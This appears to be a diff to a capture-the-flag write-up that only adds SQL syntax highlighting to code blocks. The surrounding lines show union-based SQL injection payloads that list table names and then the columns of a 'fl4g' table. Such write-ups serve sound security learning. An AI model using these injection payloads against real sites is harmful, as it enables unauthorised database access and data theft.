@@ -61,7 +61,7 @@
 
 	union select 1,database(),group_concat(**table_name**)from information_schema.tables where table_schema=**database()**--+
 
-```
+```sql
 union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=database()--+
 ```
 
@@ -71,7 +71,7 @@ union select 1,database(),group_concat(table_name)from information_schema.tables
 
    union select 1,database(),group_concat(**column_name**)from information_schema.columns where table_name=**'fl4g'**--+
 
-   ```
+   ```sql
    union select 1,database(),group_concat(column_name)from information_schema.columns where table_name='fl4g'--+
    ```
 
